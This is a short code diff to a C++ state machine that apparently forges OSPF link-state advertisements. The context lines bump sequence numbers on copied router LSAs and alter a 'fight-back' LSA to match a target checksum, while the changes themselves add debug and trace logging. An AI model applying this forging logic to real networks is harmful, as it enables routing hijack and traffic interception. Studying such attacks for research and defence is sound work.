@@ -326,7 +326,7 @@ namespace statemachine {
 					context<Machine>().setTimeout(3s);
 					return discard_event();
 				} else {
-					logger->info("Collected {} LSAs in total.", v.size());
+					logger->info("Collected {} unique LSAs.", v.size());
 					return transit<PerformAttack>();
 				}
 			}
@@ -346,6 +346,9 @@ namespace statemachine {
 						     lsa->getHeader().advertising_router == b)) {
 							auto src = (lsa->getHeader().advertising_router == a) ? a : b;
 							auto dst = (lsa->getHeader().advertising_router == a) ? b : a;
+							
+							logger->debug("Found ROUTER-LSA from {}.", Tins::IPv4Address(parser::byteswap<uint32_t>(src)).to_string());
+							
 							auto newLSA = std::make_shared<parser::LSAPacket>(
 								lsa->serialize());
 							
@@ -364,6 +367,7 @@ namespace statemachine {
 								auto hdr = newLSA->getHeader();
 								hdr.seq++;
 								newLSA->setHeader(hdr);
+								logger->trace("Forged LSA has seq {}.", hdr.seq);
 							}
 							
 							auto origFBLSA = std::make_shared<parser::LSAPacket>(
@@ -382,6 +386,7 @@ namespace statemachine {
 								auto hdr = newFBLSA->getHeader();
 								hdr.seq ++;
 								newFBLSA->setHeader(hdr);
+								logger->trace("Forged FBLSA has seq {}.", hdr.seq);
 								newFBLSA->updateValues();
 								
 								std::optional<std::shared_ptr<parser::LSAPacket>> yay = newFBLSA->modToChecksum(tgtChecksum);
